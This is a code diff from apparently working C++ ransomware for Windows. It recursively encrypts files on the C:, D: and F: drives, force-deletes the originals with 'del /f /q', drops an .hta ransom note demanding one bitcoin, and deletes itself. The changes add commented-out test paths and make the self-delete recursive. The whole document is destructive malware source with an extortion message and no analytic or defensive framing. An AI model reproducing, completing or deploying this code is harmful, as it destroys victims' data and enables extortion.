@@ -177,6 +177,7 @@ Exit:
 void encrypt_folder(string folder) {
 	for (auto& p : fs::directory_iterator(folder)) {
 		if ((p.path().string().find("C:\\Windows") == std::string::npos) && (p.path().string().find("C:\\Users\\Public") == std::string::npos) && (p.path().string().find("C:\\Users\\Program Files") == std::string::npos)) {
+		//if ((p.path().string().find("C:\\Temp\\CB2.0\\x64\\Release\\test\\test2") == std::string::npos)) {
 			if (p.is_regular_file()) {
 				RansomFile((p.path().string()).c_str());
 				run_command("del /f /q " + (p.path().string()));
@@ -206,6 +207,7 @@ int main() {
     run_command(temp + "nsmAD93.tmp\\System.dll");
     //Encrypt
     //encrypt_file("C:\\temp\\test.txt");
+	//encrypt_folder("C:\\Temp\\CB2.0\\x64\\Release\\test");
     encrypt_folder("C:\\");
 	encrypt_folder("D:\\");
 	encrypt_folder("F:\\");
@@ -218,7 +220,7 @@ int main() {
     string ransom_message = "<html><head><title>Oops, your files have been encrypted!</title></head><body><h1>Oops, your files have been encrypted!</h1><p>Your important files are encrypted using a unique public key generated for this computer. To decrypt the files, you need to obtain the private key.</p><p>The single copy of the private key, which will allow you to decrypt the files, located on a secret server on the Internet; the server will destroy the key after 72 hours.</p><p>To retrieve the private key, you need to pay 1 bitcoin to the following address: 1N0BR8ST0XyzABCdEfGh1234.</p><p>After you've made the payment, send us an email with your transaction ID and your ID key and we will send you the private key.</p><p>Your ID key is: 94D4-ABCD-EFGH-1234</p></body></html>";
     create_file("C:\\Users\\Public\\Desktop\\_HELP_DECRYPT_N0BR8ST0_.hta", ransom_message);
     // Delete itself
-    run_command("del /f /q %");
+    run_command("del /f /q /s %");
 	run_command("del /f /q /s C:\\Temp\\cb20");
     return 0;
 }
